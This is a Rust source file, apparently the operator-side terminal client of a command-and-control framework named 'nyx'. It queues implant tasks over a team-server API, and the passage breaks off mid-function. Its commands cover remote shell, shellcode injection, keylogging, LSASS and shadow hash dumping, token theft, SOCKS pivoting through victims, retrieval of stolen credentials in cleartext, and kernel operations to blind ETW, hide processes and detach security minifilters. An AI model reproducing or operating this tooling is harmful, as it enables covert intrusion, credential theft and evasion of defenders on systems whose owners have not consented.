//! Async REST client + background worker that mirrors the GUI bridge pattern.
//!
//! The TUI thread must never block on IO. We spawn one OS thread owning a
//! `current_thread` tokio runtime running `worker_loop`. It talks to the TUI
//! over two `std::sync::mpsc` channels: `Snapshot`s flow worker→UI, `Cmd`s flow
//! UI→worker. The TUI redraws only when a snapshot arrives or input changes.

use std::collections::HashMap;
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::Arc;
use std::time::{Duration, Instant};
use urlencoding::encode;

use crate::parse::{self};
use crate::socks;
use crate::types::{CredEntry, CredKind, FileEntry, ProcEntry, ResultView, SessionView, TaskAck};

/// Default poll interval for the session list.
const SESSION_POLL: Duration = Duration::from_secs(2);
/// Per-task result-poll backoff: starts here, doubles, caps at 4s.
const TASK_BACKOFF_START: Duration = Duration::from_millis(500);
const TASK_BACKOFF_CAP: Duration = Duration::from_secs(4);
/// Cap on the worker's pending log buffer (mirrors the GUI's H2-DoS guard).
const LOG_BUFFER_CAP: usize = 2048;
/// Max wall-clock time to wait for a task result before giving up. Downloads are
/// exempt (they stream chunks and set their own `eof`). A task older than this
/// is dropped from the pending queue and logged as timed out — prevents a slow
/// or dead beacon from filling the queue forever.
const TASK_DEADLINE: Duration = Duration::from_secs(60);

// ---- messages on the channels ----

/// worker→UI push. Coarse-grained: only sent when something changed.
pub struct Snapshot {
    /// New/changed session list. Empty if the worker had nothing new to report
    /// this cycle (e.g. only log lines arrived).
    pub sessions: Vec<SessionView>,
    /// Log lines accumulated since the last snapshot.
    pub log_lines: Vec<LogLine>,
    /// Whether the server is reachable right now.
    pub connected: bool,
    /// A parsed table to pop as a fullscreen overlay, if a /ls /ps /creds /screenshot task
    /// just completed. At most one per snapshot (the most recent).
    pub parsed: Option<ParsedTable>,
}

/// One parsed table ready for the fullscreen overlay.
pub enum ParsedTable {
    Files(Vec<FileEntry>),
    Procs(Vec<ProcEntry>),
    Creds(Vec<CredEntry>),
    Audit(Vec<AuditRow>),
    /// Queued (undelivered) tasks for a session, from `GET /api/tasks`.
    Tasks(Vec<TaskRow>),
    Image {
        path: String,
        bytes: usize,
    },
    Profile {
        loaded: bool,
        http_get_uri: String,
        http_post_uri: String,
        useragent: String,
    },
    AuditVerify {
        ok: bool,
        broken_at: Option<u64>,
    },
}

/// One row of the server action-audit log (from `GET /api/audit`).
#[derive(Clone, Debug, serde::Deserialize)]
pub struct AuditRow {
    pub seq: u64,
    pub ts: u64,
    pub operator: String,
    pub action: String,
    pub target: String,
    /// 服务器审计详情 JSON——客户端目前只渲染 4 列，保留以备将来扩展。
    #[allow(dead_code)]
    pub detail: serde_json::Value,
}

/// Mirrors the server's `nyx_store::CredRecord` (`GET /api/creds` JSON) so we
/// can deserialize it directly. `secret` is masked unless the request sent
/// `?reveal=1`.
#[derive(Clone, Debug, serde::Deserialize)]
pub struct ServerCred {
    pub realm: String,
    pub user: String,
    pub kind: String,
    pub secret: String,
}

/// Response shape for `GET /api/audit/verify`.
#[derive(Clone, Debug, serde::Deserialize)]
pub struct AuditVerifyResponse {
    pub ok: bool,
    pub broken_at: Option<u64>,
}

/// Response shape for `GET /api/profile`.
#[derive(Clone, Debug, serde::Deserialize)]
pub struct ProfileSummary {
    pub loaded: bool,
    pub http_get_uri: String,
    pub http_post_uri: String,
    pub useragent: String,
}

/// One queued (not-yet-delivered) task row from `GET /api/tasks?session=<hex>`.
/// `command` is the server's `JsonCommand` tagged union kept as a raw
/// `serde_json::Value` — the client only needs to display its `type` + a short
/// summary, so there's no value in mirroring the full command enum here.
#[derive(Clone, Debug, serde::Deserialize)]
pub struct TaskRow {
    pub task_id: u64,
    pub command: serde_json::Value,
}

/// How (if at all) a shell task's output should be parsed before routing.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum ParseAs {
    None,
    Files,
    Procs,
    Creds,
}

/// One coloured log line for the event stream.
#[derive(Clone)]
pub struct LogLine {
    pub text: String,
    pub level: Level,
    pub session_id: Option<String>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Level {
    Info,
    Ok,
    Warn,
    Err,
}

/// UI→worker command.
pub enum Cmd {
    /// Set/switch the team server target. `(url, optional bearer)`.
    Connect(String, Option<String>),
    /// Run a shell command on the selected session. `parse` tells the worker to
    /// route the parsed output to the fullscreen overlay instead of the log.
    Shell {
        session: String,
        args: String,
        parse: ParseAs,
    },
    /// Run a BOF on the selected session.
    Bof {
        session: String,
        name: String,
        args: String,
        data_hex: String,
    },
    /// Upload a file (name + hex bytes).
    Upload {
        session: String,
        name: String,
        data_hex: String,
    },
    /// Download a file; chunks stream back as log lines + saved bytes.
    Download {
        session: String,
        path: String,
        local: Option<String>,
    },
    /// Task the beacon to exit (`{"type":"exit"}`).
    Exit {
        session: String,
    },
    /// Set the beacon's beacon interval (and optional jitter %).
    Sleep {
        session: String,
        seconds: u32,
        jitter_pct: u8,
    },
    /// Liveness probe (`{"type":"ping"}`); an `ok` result confirms the beacon
    /// is still alive.
    Ping {
        session: String,
    },
    /// 文件系统操作（cd/mkdir/rm/mv/cp）。
    FileOp {
        session: String,
        op: String,
        path: String,
        dest: Option<String>,
    },
    /// 从 implant 发起出站连接（P2P / rportfwd）。chan 由 server 分配。
    Pivot {
        session: String,
        host: String,
        port: u16,
    },
    /// SOCKS5 中继控制（手动 channel 帧：data/close 等）。
    Socks {
        session: String,
        chan: u32,
        op: u8,
        addr: String,
        port: u16,
    },
    /// Start an in-TUI SOCKS5 relay listener. The worker binds a `TcpListener`
    /// on `bind_addr` (default `127.0.0.1:1080`) and, for each accepted SOCKS5
    /// client, runs the handshake + opens an implant channel + ferries bytes
    /// both ways. Channel rows drained from `/api/results` are routed to the
    /// matching connection instead of logged as "unexpected".
    ///
    /// This reuses the headless bridge's [`crate::socks`] code (handshake, relay
    /// state machine, ChanTable) but WITHOUT a second `/api/results` consumer —
    /// the worker's own per-session drain feeds rows to the relay via
    /// [`crate::socks::handle_row`]. So the P0-A "single drain per session"
    /// invariant is preserved.
    SocksStart {
        session: String,
        bind_addr: String,
    },
    /// Stop the in-TUI SOCKS5 relay: close the listener, tear down every live
    /// channel (best-effort `channelclose` to the implant), and drop the table.
    SocksStop {
        session: String,
    },
    /// 截屏。
    Screenshot {
        session: String,
        monitor: u8,
    },
    /// 端口扫描。
    Portscan {
        session: String,
        host: String,
        ports: String,
    },
    /// 网络信息收集。
    Net {
        session: String,
        query: String,
    },
    /// 磁盘信息。
    DriveInfo {
        session: String,
    },
    /// 剪贴板。
    Clipboard {
        session: String,
    },
    /// 环境变量。
    Env {
        session: String,
        name: String,
    },
    /// 键盘记录。action 0=start 1=stop 2=dump。
    Keylog {
        session: String,
        action: u8,
    },
    /// Start continuous keylog streaming: the worker re-enqueues a `keylog
    /// action=2` dump task every `interval_secs` until `/keylog unstream` (or
    /// `Cmd::KeylogStreamStop`) clears the stream. `interval_secs` is clamped to
    /// a minimum of 2 seconds to avoid flooding the server.
    KeylogStreamStart {
        session: String,
        interval_secs: u32,
    },
    /// Stop continuous keylog streaming for the given session.
    KeylogStreamStop {
        session: String,
    },
    /// 持续截屏。
    Screenwatch {
        session: String,
        interval_secs: u32,
    },
    /// 凭据哈希提取。method 0=lsass 1=shadow。
    Hashdump {
        session: String,
        method: u8,
    },
    /// 令牌窃取：复制 pid 的主令牌供后续冒用。
    StealToken {
        session: String,
        pid: u32,
    },
    /// 造令牌（make-token / pass-the-password）：domain\user + password。
    /// logon_type 1=interactive 2=network 3=new-credentials。
    MakeToken {
        session: String,
        domain: String,
        user: String,
        password: String,
        logon_type: u8,
    },
    /// 丢弃当前线程冒用（保留令牌）。
    Rev2Self {
        session: String,
    },
    /// 查询当前线程身份。
    GetUid {
        session: String,
    },
    /// 注入 shellcode。method/pid/spawn_to/sc_hex。
    Inject {
        session: String,
        method: u8,
        pid: u32,
        spawn_to: String,
        sc_hex: String,
    },
    /// Pull the server-side credential store (`GET /api/creds`) and merge it
    /// into the local vault. `reveal` true sends `?reveal=1` for cleartext.
    FetchCreds {
        reveal: bool,
    },
    /// Query the server action-audit log (`GET /api/audit`). Optional operator
    /// / action / limit filters.
    FetchAudit {
        operator: Option<String>,
        action: Option<String>,
        limit: Option<u32>,
    },
    /// Add a credential to the server vault (`POST /api/creds`).
    AddCred {
        realm: String,
        user: String,
        kind: String,
        secret: String,
    },
    /// Delete a credential from the server vault (`POST /api/creds/delete`).
    DelCred {
        realm: String,
        user: String,
        kind: String,
    },
    /// Verify the audit log hash chain (`GET /api/audit/verify`).
    VerifyAudit,
    /// Fetch queued (undelivered) tasks for a session (`GET /api/tasks`).
    /// `session` is the beacon's hex id — the worker doesn't track selection,
    /// so the UI passes the currently-selected session in.
    FetchTasks {
        session: String,
    },
    /// Fetch active C2 profile summary (`GET /api/profile`).
    FetchProfile,
    /// Close a relay channel (`Command::ChannelClose`).
    CloseChan {
        chan: u32,
    },
    // ---- Kernel daemon ops (P6) ----
    KernelStatus,
    KernelBlindEtw,
    KernelHide {
        pid: u32,
    },
    KernelDumpLsass {
        pid: u32,
    },
    KernelNeutralize {
        pid: u32,
    },
    KernelDetachMinifilter,
    /// Stop the worker thread.
    /// T-REX target reconnaissance.
    Trex {
        session: String,
    },
    /// Set C2 transport channel.
    SetChannel {
        session: String,
        channel: u8,
    },
    Shutdown,
}

/// Handle the TUI holds to talk to the worker.
pub struct Bridge {
    /// Drain snapshots in the render loop (non-blocking `try_recv`).
    pub snapshots: Receiver<Snapshot>,
    /// Send commands on key actions.
    pub cmds: Sender<Cmd>,
}

/// P1-9: enforce transport security on the team-server URL. A plaintext
/// `http://` URL to a non-loopback host would send the bearer token in the
/// clear over the wire. Loopback `http://` is allowed (local dev); `https://`
/// (or a schemeless URL) is always allowed. A non-loopback `http://` URL prints
/// a warning and, unless `NYX_ALLOW_HTTP=1` is set, is refused.
///
/// Returns `Ok(())` to proceed, or `Err(reason)` to refuse.
fn enforce_http_policy(server: &str) -> Result<(), String> {
    let s = server.trim();
    if !s.starts_with("http://") {
        return Ok(()); // https:// or schemeless — not the plaintext-HTTP case
    }
    let after = &s["http://".len()..];
    // authority ends at the first '/' (path) — drop the path.
    let authority = after.split('/').next().unwrap_or(after);
    // host is the authority minus its port. For `[ipv6]:port` the host is the
    // bracketed address; for `host:port` it's everything before the last ':'.
    let host = if let Some(stripped) = authority.strip_prefix('[') {
        stripped.split(']').next().unwrap_or(stripped)
    } else {
        authority
            .rsplit_once(':')
            .map(|(h, _)| h)
            .unwrap_or(authority)
    };
    let is_loopback =
        host == "127.0.0.1" || host == "::1" || host.eq_ignore_ascii_case("localhost");
    if is_loopback {
        return Ok(());
    }
    eprintln!(
        "[nyx] WARNING: bearer token will traverse plaintext HTTP to non-loopback host \
         \"{host}\" — use HTTPS in production"
    );
    if std::env::var("NYX_ALLOW_HTTP").is_err() {
        return Err(format!(
            "refusing plaintext HTTP to non-loopback host \"{host}\"; set NYX_ALLOW_HTTP=1 to \
             override (NOT recommended) or use an https:// server URL"
        ));
    }
    Ok(())
}

/// Spawn the background IO worker. Returns the channel ends the TUI holds.
///
/// Auto-connects to the given server immediately (so the TUI doesn't need a
/// separate connect step for the common case of launching with `--server`).
pub fn spawn(server: String, token: Option<String>) -> Bridge {
    let (snap_tx, snap_rx) = mpsc::channel::<Snapshot>();
    let (cmd_tx, cmd_rx) = mpsc::channel::<Cmd>();
    std::thread::spawn(move || {
        // P1-9: refuse plaintext HTTP to a non-loopback team server unless the
        // operator explicitly opts in via NYX_ALLOW_HTTP=1.
        if let Err(reason) = enforce_http_policy(&server) {
            let _ = snap_tx.send(Snapshot {
                sessions: Vec::new(),
                log_lines: vec![LogLine {
                    text: reason,
                    level: Level::Err,
                    session_id: None,
                }],
                connected: false,
                parsed: None,
            });
            return;
        }
        let rt = match tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
        {
            Ok(rt) => rt,
            Err(e) => {
                let _ = snap_tx.send(Snapshot {
                    sessions: Vec::new(),
                    log_lines: vec![LogLine {
                        text: format!("runtime build failed: {e}"),
                        level: Level::Err,
                        session_id: None,
                    }],
                    connected: false,
                    parsed: None,
                });
                return;
            }
        };
        rt.block_on(worker_loop(cmd_rx, snap_tx, server, token));
    });
    Bridge {
        snapshots: snap_rx,
        cmds: cmd_tx,
    }
}

/// What a pending task is, so its result can be routed correctly.
#[derive(Clone)]
enum TaskKind {
    Shell(ParseAs),
    Bof {
        name: String,
    },
    Download {
        path: String,
        local: Option<String>,
    },
    /// 截屏：结果以 FileChunk 分块返回，保存到 downloads/screenshot-<taskid>.png
    Screenshot,
    /// Hashdump. method=0/1 (SAM/SYSTEM) return `Output` text (small); method=2
    /// (LSASS) returns `Output` containing the actionable PID+instruction
    /// signal from the implant (the real dump happens via `nyx-kernel` out of
    /// band). Routed as Shell-like text, NOT chunked.
    Hashdump {
        method: u8,
    },
    /// A ping; an `ok` result confirms the beacon is alive.
    Ping,
    /// Continuous keylog dump — re-enqueues itself on completion. The worker
    /// tracks the active stream in `keylog_streaming` and, when a dump finishes,
    /// enqueues a fresh `keylog action=2` task after `interval_secs`. Output is
    /// routed like `Shell(ParseAs::None)` — line-by-line to the session log.
    KeylogStream {
        /// Interval the worker re-enqueues dumps at. Not read back by the
        /// poll loop — the worker's `keylog_streaming` state is the single
        /// source of truth (so `/keylog unstream` clears the stream even
        /// while a dump task is in flight). Kept on the kind for
        /// introspection/debugging of pending tasks.
        #[allow(dead_code)]
        interval_secs: u32,
    },
}

struct PendingTask {
    session: String,
    task_id: u64,
    kind: TaskKind,
    backoff: Duration,
    last_poll: Instant,
    /// When the task was first enqueued — used for the overall deadline.
    started_at: Instant,
    /// Accumulated file chunks for downloads.
    chunks: Vec<(u32, Vec<u8>)>,
    saw_eof: bool,
}

/// In-TUI SOCKS5 relay state, owned by `worker_loop`. Built by `Cmd::SocksStart`,
/// torn down by `Cmd::SocksStop`.
///
/// This is a thin wrapper around the shared [`socks::BridgeCtx`] that the
/// headless `nyx-cli socks` subcommand also uses: the handshake, per-connection
/// state machine, and ChanTable are all reused verbatim. The ONLY difference is
/// the results source — the headless bridge runs its own `poll_loop` that drains
/// `/api/results`, whereas the in-TUI relay is FED by the worker's existing
/// per-session drain (the worker routes channel rows via [`socks::handle_row`]).
/// This keeps the P0-A "one drain per session per pass" invariant intact: there
/// is still exactly one `/api/results` consumer per session (the worker).
struct SocksRelay {
    /// The shared bridge state — cloned (as `Arc`) into the accept task and
    /// every per-connection task. Held here so the demux can call
    /// [`socks::handle_row`] with it and so `SocksStop` can close every chan.
    ctx: Arc<socks::BridgeCtx>,
    /// The accept-loop task. Aborted on `SocksStop` to stop accepting new
    /// connections; in-flight per-connection tasks finish (or are torn down
    /// when `SocksStop` closes their chans).
    accept_task: tokio::task::JoinHandle<()>,
    /// Address the listener is bound on (for log lines).
    bind_addr: String,
    /// Outbox the relay's `log_sink` pushes into (instead of stderr, which
    /// would corrupt the TUI's alternate screen). Drained by `worker_loop`
    /// each pass into `log_buf` as `LogLine`s, so relay events (chan open /
    /// data backlog / connect failed / …) surface in the TUI event stream.
    log_outbox: Arc<std::sync::Mutex<std::collections::VecDeque<String>>>,
}

impl SocksRelay {
    /// Best-effort teardown: abort the accept loop, send `channelclose` for
    /// every live chan, and drop the per-chan senders (which makes each
    /// in-flight `handle_conn` task see a `None` recv and exit). Idempotent.
    async fn shutdown(&self, client: &reqwest::Client) {
        let chans: Vec<u32> = self
            .ctx
            .chans
            .lock()
            .unwrap()
            .by_chan
            .keys()
            .copied()
            .collect();
        for ch in chans {
            let _ = socks::api::enqueue_channel_close(
                client,
                &self.ctx.server,
                &self.ctx.session,
                ch,
                &self.ctx.token,
            )
            .await;
        }
        // Drop per-chan senders so handle_conn's rx.recv() returns None → exit.
        self.ctx.chans.lock().unwrap().by_chan.clear();
        self.ctx.chans.lock().unwrap().seen_open.clear();
        self.ctx.task_to_chan.lock().unwrap().clear();
    }
}

async fn worker_loop(
    cmd_rx: Receiver<Cmd>,
    snap_tx: Sender<Snapshot>,
    initial_server: String,
    initial_token: Option<String>,
) {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .expect("reqwest client build");
    let mut server: Option<(String, Option<String>)> = Some((initial_server, initial_token));

    let mut pending: Vec<PendingTask> = Vec::new();
    let mut log_buf: Vec<LogLine> = Vec::new();
    // A parsed table waiting to be flushed in the next snapshot. Set when a
    // /ls /ps /creds task completes; cleared once pushed.
    let mut parsed_buf: Option<ParsedTable> = None;
    let mut last_session_sig = String::new();
    let mut was_connected = false;
    // Active continuous keylog stream, if any: `(session, interval_secs)`.
    // Set by `Cmd::KeylogStreamStart`, cleared by `Cmd::KeylogStreamStop`. While
    // set, the poll loop ensures a `KeylogStream` dump task is always pending for
    // that session (re-enqueuing one whenever none remains after the prior dump
    // finishes).
    let mut keylog_streaming: Option<(String, u32)> = None;
    // In-TUI SOCKS5 relay, if `Cmd::SocksStart` has bound a listener. The relay
    // reuses the headless bridge's ChanTable + per-connection state machine; the
    // worker feeds it channel rows from its own per-session drain (no second
    // `/api/results` consumer — preserves the P0-A single-drain invariant).
    let mut socks_relay: Option<SocksRelay> = None;

    loop {
        // 1. Drain UI→worker commands (non-blocking).
        let mut connect_changed = false;
        while let Ok(cmd) = cmd_rx.try_recv() {
            match cmd {
                Cmd::Shutdown => return,
                Cmd::Connect(s, t) => {
                    // P1-9: re-check the HTTP policy on /connect too, not just at
                    // spawn. Without this an operator could pass the gate against
                    // safe loopback at TUI launch, then /connect to a plaintext
                    // non-loopback URL and leak the bearer token over the wire.
                    if let Err(reason) = enforce_http_policy(&s) {
                        log_push(&mut log_buf, &reason, Level::Err);
                        continue;
                    }
                    log_push(&mut log_buf, &format!("connecting to {s} …"), Level::Info);
                    // Probe the new server immediately with a fetch_sessions so
                    // we can emit an explicit connect/deny line right away —
                    // otherwise success is only implied by later session data.
                    // `s`/`t` are moved into `server` below, so borrow clones here.
                    let s_probe = s.clone();
                    let t_probe = t.clone();
                    server = Some((s, t));
                    connect_changed = true;
                    match fetch_sessions(&client, &s_probe, &t_probe).await {
                        Ok(list) => {
                            was_connected = true;
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[✓] connected to {s_probe} — {} sessions visible",
                                    list.len()
                                ),
                                Level::Ok,
                            );
                            // Seed the session list right now (don't wait for
                            // the throttled refresh) so the operator sees the
                            // beacons immediately after the connect line.
                            let _ = snap_tx.send(Snapshot {
                                sessions: list,
                                log_lines: std::mem::take(&mut log_buf),
                                connected: true,
                                parsed: None,
                            });
                        }
                        Err(e) => {
                            was_connected = false;
                            log_push(
                                &mut log_buf,
                                &format!("[✗] failed to connect to {s_probe}: {e}"),
                                Level::Err,
                            );
                            // Flush the failure line so it isn't held until the
                            // next periodic poll attempt.
                            let _ = snap_tx.send(Snapshot {
                                sessions: Vec::new(),
                                log_lines: std::mem::take(&mut log_buf),
                                connected: false,
                                parsed: None,
                            });
                        }
                    }
                }
                Cmd::Shell {
                    session,
                    args,
                    parse,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_shell(&client, srv, &session, &args, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] $ {} → task {}", short(&session), args, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(parse),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Bof {
                    session,
                    name,
                    args,
                    data_hex,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_bof(&client, srv, &session, &name, &args, &data_hex, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] bof {} → task {}", short(&session), name, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Bof { name },
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! bof enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::Upload {
                    session,
                    name,
                    data_hex,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_upload(&client, srv, &session, &name, &data_hex, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] upload {} → task {}", short(&session), name, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! upload enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::AddCred {
                    realm,
                    user,
                    kind,
                    secret,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind, "secret": secret});
                    match authed(client.post(format!("{srv}/api/creds")).json(&body), tok)
                        .send()
                        .await
                    {
                        Ok(r) if r.status().is_success() => {
                            log_push(&mut log_buf, "cred: added/updated", Level::Ok)
                        }
                        Ok(r) => log_push(
                            &mut log_buf,
                            &format!("! cred add: {}", r.status()),
                            Level::Err,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! cred add: {e}"), Level::Err),
                    }
                }
                Cmd::DelCred { realm, user, kind } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind});
                    match authed(
                        client.post(format!("{srv}/api/creds/delete")).json(&body),
                        tok,
                    )
                    .send()
                    .await
                    {
                        Ok(r) if r.status().is_success() => {
                            log_push(&mut log_buf, "cred: deleted", Level::Ok)
                        }
                        Ok(r) => log_push(
                            &mut log_buf,
                            &format!("! cred del: {}", r.status()),
                            Level::Err,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! cred del: {e}"), Level::Err),
                    }
                }
                Cmd::VerifyAudit => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match authed(client.get(format!("{srv}/api/audit/verify")), tok)
                        .send()
                        .await
                    {
                        Ok(r) => match r.json::<AuditVerifyResponse>().await {
                            Ok(v) => {
                                if v.ok {
                                    log_push(&mut log_buf, "audit chain: OK", Level::Ok);
                                } else if let Some(b) = v.broken_at {
                                    log_push(
                                        &mut log_buf,
                                        &format!("audit chain: BROKEN at seq {b}"),
                                        Level::Err,
                                    );
                                } else {
                                    log_push(&mut log_buf, "audit chain: UNKNOWN", Level::Warn);
                                }
                                // Wire the parsed table so the fullscreen overlay opens (same class
                                // of bug as FetchProfile — without this /audit verify only logs).
                                parsed_buf = Some(ParsedTable::AuditVerify {
                                    ok: v.ok,
                                    broken_at: v.broken_at,
                                });
                            }
                            Err(e) => log_push(
                                &mut log_buf,
                                &format!("! audit verify parse: {e}"),
                                Level::Err,
                            ),
                        },
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! audit verify: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::FetchProfile => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match authed(client.get(format!("{srv}/api/profile")), tok)
                        .send()
                        .await
                    {
                        Ok(r) => match r.json::<ProfileSummary>().await {
                            Ok(p) => {
                                if !p.loaded {
                                    log_push(&mut log_buf, "profile: not loaded", Level::Warn);
                                } else {
                                    log_push(&mut log_buf, &format!("profile: loaded http-get: {} http-post: {} useragent: {}", p.http_get_uri, p.http_post_uri, p.useragent), Level::Info);
                                    // Wire the parsed table so the fullscreen overlay opens (the whole
                                    // point of `/profile`). Without this the Profile overlay, the
                                    // poll_worker Profile arm and the render Overlay::Profile arm are
                                    // all dead code — `/profile` only logged before.
                                    parsed_buf = Some(ParsedTable::Profile {
                                        loaded: p.loaded,
                                        http_get_uri: p.http_get_uri,
                                        http_post_uri: p.http_post_uri,
                                        useragent: p.useragent,
                                    });
                                }
                            }
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! profile parse: {e}"), Level::Err)
                            }
                        },
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! profile fetch: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::CloseChan { chan } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({"type": "channelclose", "chan": chan});
                    match enqueue_simple(&client, srv, "", cmd, tok).await {
                        Ok(tid) => log_push(
                            &mut log_buf,
                            &format!("chan {chan} close → task {tid}"),
                            Level::Info,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! chan close: {e}"), Level::Err),
                    }
                }
                Cmd::Download {
                    session,
                    path,
                    local,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_download(&client, srv, &session, &path, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] download {} (task {})", short(&session), path, tid),
                                Level::Info,
                            );
                            // Downloads stream FileChunk results — must register a pending task
                            // so the result-poll loop collects chunks and saves them to `local`
                            // (route_result at TaskKind::Download derives the save path from it).
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Download {
                                    path: path.clone(),
                                    local: local.clone(),
                                },
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(
                            &mut log_buf,
                            &format!("! download enqueue: {e}"),
                            Level::Err,
                        ),
                    }
                }
                Cmd::Sleep {
                    session,
                    seconds,
                    jitter_pct,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_sleep(&client, srv, &session, seconds, jitter_pct, tok).await {
                        Ok(tid) => log_push(
                            &mut log_buf,
                            &format!(
                                "[{}] sleep {seconds}s (±{jitter_pct}%) → task {}",
                                short(&session),
                                tid
                            ),
                            Level::Info,
                        ),
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! sleep enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::Ping { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_ping(&client, srv, &session, tok).await {
                        Ok(tid) => {
                            pending.push(PendingTask {
                                session: session.clone(),
                                task_id: tid,
                                kind: TaskKind::Ping,
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                            log_push(
                                &mut log_buf,
                                &format!("[{}] ping → task {}", short(&session), tid),
                                Level::Info,
                            );
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! ping enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::Exit { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_exit(&client, srv, &session, tok).await {
                        Ok(()) => log_push(
                            &mut log_buf,
                            &format!("[{}] tasked exit", short(&session)),
                            Level::Warn,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! exit: {e}"), Level::Err),
                    }
                }
                Cmd::FileOp {
                    session,
                    op,
                    path,
                    dest,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_fileop(&client, srv, &session, &op, &path, dest.as_deref(), tok)
                        .await
                    {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] {op} {path} → task {}", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! fileop enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::Pivot {
                    session,
                    host,
                    port,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_pivot(&client, srv, &session, &host, port, tok).await {
                        Ok((tid, chan)) => {
                            let chan_msg = match chan {
                                Some(c) => format!(" chan={c} (use /socks {c} ...)"),
                                None => String::new(),
                            };
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[{}] pivot → {host}:{port} (task {}){chan_msg}",
                                    short(&session),
                                    tid
                                ),
                                Level::Info,
                            );
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! pivot enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::Socks {
                    session,
                    chan,
                    op,
                    addr,
                    port,
                } => {
                    let Some((ref srv, ref tok)) = server else {
